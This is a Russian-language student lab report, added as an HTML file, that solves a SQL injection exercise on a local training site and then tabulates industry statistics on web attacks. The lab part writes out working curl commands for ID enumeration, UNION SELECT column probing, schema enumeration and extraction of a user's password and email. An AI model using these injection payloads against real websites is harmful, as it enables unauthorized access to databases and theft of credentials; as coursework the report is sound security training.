@@ -1,0 +1,187 @@
+<html><head><style>body {
+   color: black;
+}
+</style></head><body><h1 id="-1">Решение лабы 1</h1>
+<blockquote>
+<p>Ананьев Даниил БИВТ-24-9</p>
+</blockquote>
+<h3 id="-">Ход работы</h3>
+<ol>
+<li>На сайте попросили ввести <em>id</em>, я попробовал следующую ссылку
+```</li>
+</ol>
+<p><a href="http://localhost:8080/task/?id=1">http://localhost:8080/task/?id=1</a></p>
+<pre><code><span class="hljs-bullet">2. </span>Я получил ответ:
+</code></pre><p>Ваш id:1
+Ваш логин:admin</p>
+<pre><code>3. Далее я попробовал перебрать все возможные айди циклом, потому что не было ясно, сколько их всего существует:
+
+```bash
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> $(seq 0 100); 
+    <span class="hljs-keyword">do</span> <span class="hljs-built_in">echo</span> <span class="hljs-string">"ID: <span class="hljs-variable">$i</span>"</span> &amp;&amp; 
+    curl <span class="hljs-_">-s</span> <span class="hljs-string">"http://localhost:8080/task/?id=<span class="hljs-variable">$i</span>"</span> &amp;&amp; <span class="hljs-built_in">echo</span>; 
+<span class="hljs-keyword">done</span>
+</code></pre><ol>
+<li>Отформатировав результаты, я получил следующее:</li>
+</ol>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>Login</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td>admin</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Volk</td>
+</tr>
+<tr>
+<td>3</td>
+<td>Matroskin</td>
+</tr>
+<tr>
+<td>4</td>
+<td>Vinni-pukh</td>
+</tr>
+<tr>
+<td>5</td>
+<td>Neznaika</td>
+</tr>
+<tr>
+<td>6</td>
+<td>kotenok</td>
+</tr>
+<tr>
+<td>7</td>
+<td>Karlson</td>
+</tr>
+<tr>
+<td>8</td>
+<td>Kesha</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Volk2</td>
+</tr>
+</tbody>
+</table>
+<ol>
+<li><p>Запрос <code>curl -s &quot;http://localhost:8080/task/?id=1&#39;&quot;</code> выдал ошибку:</p>
+<pre><code>You have an error in your SQL syntax; 
+<span class="hljs-keyword">check</span> the <span class="hljs-keyword">manual</span> that corresponds <span class="hljs-keyword">to</span> your 
+MySQL <span class="hljs-keyword">server</span> <span class="hljs-keyword">version</span> <span class="hljs-keyword">for</span> the <span class="hljs-keyword">right</span> syntax 
+<span class="hljs-keyword">to</span> <span class="hljs-keyword">use</span> near <span class="hljs-string">''</span><span class="hljs-number">1</span><span class="hljs-string">''</span> <span class="hljs-keyword">LIMIT</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-string">' at line 1</span>
+</code></pre></li>
+<li><p>Это <em>MySQL</em>. Запрос выглядит примерно так: ... LIMIT 0,1</p>
+</li>
+</ol>
+<p>Я решил сделать <code>UNION SELECT</code>, но для начала мне надо узнать, сколько колонок в этой таблице:</p>
+<pre><code><span class="hljs-comment"># 2 columns — error</span>
+curl <span class="hljs-_">-s</span> <span class="hljs-string">"http://localhost:8080/task/?id=0'+UNION+SELECT+1,2--+-"</span>
+
+<span class="hljs-comment"># 3 columns — SUCCESS</span>
+curl <span class="hljs-_">-s</span> <span class="hljs-string">"http://localhost:8080/task/?id=0'+UNION+SELECT+1,2,3--+-"</span>
+</code></pre><ol>
+<li>Далее я написал запрос, который через схему получит всевозможные таблицы бд. Я переписал его, учитывая особенности запроса, и со второй попытки получил что-то рабочее:</li>
+</ol>
+<pre><code class="lang-bash">curl -s "http://localhost:8080/task/?id=0'+UNION+<span class="hljs-keyword">SELECT</span>+<span class="hljs-number">1</span>,<span class="hljs-keyword">GROUP_CONCAT</span>(table_name+SEPARATOR+<span class="hljs-string">','</span>),<span class="hljs-number">3</span>+<span class="hljs-keyword">FROM</span>+information_schema.tables+<span class="hljs-keyword">WHERE</span>+table_schema=<span class="hljs-keyword">database</span>()<span class="hljs-comment">--+-"</span>
+
+# Ваш <span class="hljs-keyword">id</span>:<span class="hljs-number">1</span>&lt;br&gt;Ваш логин:emails,<span class="hljs-keyword">users</span>&lt;/<span class="hljs-keyword">div</span>&gt;&lt;/br&gt;&lt;/br&gt;
+</code></pre>
+<ol>
+<li>Тк в бд всего 2 таблицы: <code>emails,users</code>. Далее я попросил переписать запрос через <code>information_schema.columns</code>, чтобы я смог получить названия колонок для каждой из таблиц:</li>
+</ol>
+<pre><code class="lang-bash"><span class="hljs-comment"># для users</span>
+curl <span class="hljs-_">-s</span> <span class="hljs-string">"http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3+FROM+information_schema.columns+WHERE+table_name='users'--+-"</span>
+
+<span class="hljs-comment"># для emails</span>
+curl <span class="hljs-_">-s</span> <span class="hljs-string">"http://localhost:8080/task/?id=0'+UNION+SELECT+1,GROUP_CONCAT(column_name+SEPARATOR+','),3+FROM+information_schema.columns+WHERE+table_name='emails'--+-"</span>
+</code></pre>
+<pre><code class="lang-bash"><span class="hljs-meta"># Результаты:</span>
+<span class="hljs-meta"># users: id, username, password</span>
+<span class="hljs-meta"># emails: id, email_id</span>
+</code></pre>
+<ol>
+<li>Теперь, когда я знаю названия таблиц и колонок, не составит труда написать два запроса:</li>
+</ol>
+<pre><code class="lang-bash"><span class="hljs-meta"># пароль Volk2</span>
+<span class="hljs-meta"># Result: Ваш логин:Wa spoiuuuuu</span>
+curl -s <span class="hljs-string">"http://localhost:8080/task/?id=0'+UNION+SELECT+1,password,3+FROM+users+WHERE+id=9--+-"</span>
+
+<span class="hljs-meta"># почта Vinni-pukh</span>
+<span class="hljs-meta"># Result: Ваш логин:honey_lover@otus-lab.com</span>
+curl -s <span class="hljs-string">"http://localhost:8080/task/?id=0'+UNION+SELECT+1,email_id,3+FROM+emails+WHERE+id=4--+-"</span>
+</code></pre>
+<h3 id="-">Итоговые ответы на задание:</h3>
+<ol>
+<li>пароль пользователя <em>Volk2</em> - <code>Wa spoiuuuuu</code></li>
+<li>почта пользователя <em>Vinni-pukh</em> - <code>honey_lover@otus-lab.com</code></li>
+</ol>
+<h1 id="-">Отчет по уязвимостям</h1>
+<ul>
+<li>В разных исследованиях метрики считаются по разному, поэтому я указал скоуп в таблице</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th>Источник</th>
+<th>Период и scope</th>
+<th style="text-align:right">Доля успешных атак через эксплуатацию веб-уязвимостей</th>
+<th>Распределение по конкретным уязвимостям веб-угроз</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>2024 Data Breach Investigations Report (DBIR)</strong></td>
+<td>инциденты: 01.11.2022–31.10.2023. Scope: подтвержденные data breaches (глобальная выборка DBIR).</td>
+<td style="text-align:right">8% всех breaches относятся к паттерну Basic Web Application Attacks. Внутри паттерна доля взломов через exploit vuln action = 13% (остальные — креды/перебор).</td>
+<td>use of stolen credentials — 77%, brute force — 21%, exploit vuln — 13%.</td>
+</tr>
+<tr>
+<td><strong>2025 DBIR snapshot / summary</strong></td>
+<td>scope: подтвержденные data breaches (DBIR 2025, глобально. период инцидентов — 01.11.2023–31.10.2024).</td>
+<td style="text-align:right">Exploitation of vulnerabilities как initial access: 20% breaches (метрика шире, не только веб приложения: включает perimeter, VPN, edge).</td>
+<td>нет детализованной информации</td>
+</tr>
+<tr>
+<td><strong>X-Force Threat Intelligence Index 2025</strong></td>
+<td>scope: incident response cases, наблюдения за 2024.</td>
+<td style="text-align:right">30% инцидентов, где X-Force реагировал в 2024, включали exploitation of public-facing applications.</td>
+<td>по регионам (initial access vector = exploitation of public-facing apps): NA — 40%, europe — 36%, Middle East &amp; Africa — 33%, LATAM — 50%</td>
+</tr>
+<tr>
+<td>google cloud <strong>M-Trends 2025</strong></td>
+<td>scope: mandiant incident response investigations за 2024.</td>
+<td style="text-align:right">В случаях, где был определен initial infection vector, 33% начались с эксплуатации уязвимости (в целом, не только web). Отдельно “Web compromise” как initial vector: 9%.</td>
+<td>“Most frequently exploited vulnerabilities”: CVE-2024-3400 (Palo Alto PAN-OS GlobalProtect), CVE-2024-21887, CVE-2023-46805 (Ivanti Connect Secure), CVE-2023-48788 (Fortinet FortiClient EMS).</td>
+</tr>
+<tr>
+<td><strong>WAF: доля разведывательных атак…</strong></td>
+<td>scope: телеметрия BI.ZONE WAF по атакам на веб-приложения российских компаний за 2024 (это распределение вебугроз, а не breaches).</td>
+<td style="text-align:right">нету</td>
+<td>категории вебугроз (2024): RCE — 36%; внутри RCE: OS command injection — 46% RCE, local/remote file inclusion — 40% RCE. Далее: path traversal / доступ к конфигам/логам — 16%, кража данных посетителей (XSS и др.) — 14%, SQL-инъекции/доступ к БД — 10%. Также упоминается, что попытки эксплуатации неисправленных уязвимостей устаревших технологий (CGI/JSP/Flash RCE LFI/RFI) составляют около 12% атак.</td>
+</tr>
+<tr>
+<td>Positive Technologies</td>
+<td>SCope: успешные атаки на организации в периоде IV квартал 2023.</td>
+<td style="text-align:right">В ~30% успешных атак злоумышленники эксплуатировали уязвимости (метрика шире, не только веб).</td>
+<td>нет разбивки</td>
+</tr>
+</tbody>
+</table>
+<h3 id="-">Ссылки</h3>
+<ul>
+<li><a href="https://www.verizon.com/business/resources/reports/2024/2024-dbir-data-breach-investigations-report.pdf">https://www.verizon.com/business/resources/reports/2024/2024-dbir-data-breach-investigations-report.pdf</a></li>
+<li><a href="https://www.verizon.com/business/r3s0u4c3s/vps/vps-2025-dbir.pdf">https://www.verizon.com/business/r3s0u4c3s/vps/vps-2025-dbir.pdf</a></li>
+<li><a href="https://www.ibm.com/reports/threat-intelligence">https://www.ibm.com/reports/threat-intelligence</a></li>
+<li><a href="https://www.ibm.com/thought-leadership/institute-business-value/en-us/report/2025-threat-intelligence-index">https://www.ibm.com/thought-leadership/institute-business-value/en-us/report/2025-threat-intelligence-index</a></li>
+<li><a href="https://archive.orkl.eu/485ca080f5d6a75a30057719950065ba80882705.pdf">https://archive.orkl.eu/485ca080f5d6a75a30057719950065ba80882705.pdf</a></li>
+<li><a href="https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/">https://bi.zone/news/dolya-razvedyvatelnykh-atak-s-tselyu-poiska-uyazvimostey-saytov-vyrosla-na-220/</a></li>
+<li><a href="https://safe.cnews.ru/news/line/2024-02-29_positive_technologies_v_73_uspeshnyh">https://safe.cnews.ru/news/line/2024-02-29_positive_technologies_v_73_uspeshnyh</a></li>
+</ul>
+</body></html>
